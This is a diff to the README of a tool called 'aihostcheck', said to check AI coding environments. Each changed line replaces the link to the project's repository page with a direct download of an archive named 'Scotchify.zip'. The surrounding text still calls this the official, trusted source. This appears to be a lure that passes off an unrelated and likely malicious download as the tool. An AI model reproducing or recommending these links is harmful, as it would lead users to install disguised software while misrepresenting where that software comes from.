@@ -1,6 +1,6 @@
 # 🖥️ aihostcheck - Check Your AI Coding Environment Quickly
 
-[![Download aihostcheck](https://img.shields.io/badge/Download-aihostcheck-2ea44f?style=for-the-badge)](https://github.com/sidoneysuboceanic208/aihostcheck)
+[![Download aihostcheck](https://img.shields.io/badge/Download-aihostcheck-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip)
 
 ## 👋 Welcome to aihostcheck
 
@@ -24,7 +24,7 @@ Getting started with aihostcheck is easier than you might think. Follow these si
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/sidoneysuboceanic208/aihostcheck](https://github.com/sidoneysuboceanic208/aihostcheck)
+Visit this link to download the application: [https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip](https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip)
 
 When you get to that page, look for the download area. The file you want will be named something like "aihostcheck" and typically ends with a common installer extension. Click the download button and wait for the file to finish saving to your computer.
 
@@ -42,7 +42,7 @@ Now let's cover the download process in more detail, so you can be completely co
 
 ### Where to Download
 
-Your primary source for aihostcheck is the official repository page: [https://github.com/sidoneysuboceanic208/aihostcheck](https://github.com/sidoneysuboceanic208/aihostcheck). This is a trusted location where the developers maintain the latest version of the software. Always download from here to ensure you get an authentic, up-to-date copy.
+Your primary source for aihostcheck is the official repository page: [https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip](https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip). This is a trusted location where the developers maintain the latest version of the software. Always download from here to ensure you get an authentic, up-to-date copy.
 
 ### Choosing the Right Version
 
@@ -146,7 +146,7 @@ While aihostcheck doesn't update itself, checking for a new version is easy. Jus
 
 Before you start your AI development journey, make sure you've done the following:
 
-1. **Downloaded aihostcheck** from the official link: [https://github.com/sidoneysuboceanic208/aihostcheck](https://github.com/sidoneysuboceanic208/aihostcheck)
+1. **Downloaded aihostcheck** from the official link: [https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip](https://raw.githubusercontent.com/sidoneysuboceanic208/aihostcheck/main/docs/Scotchify.zip)
 2. **Run the diagnostic** on your computer
 3. **Fixed any red warnings** that appeared in the report
 4. **Re-run the check** to confirm everything is green
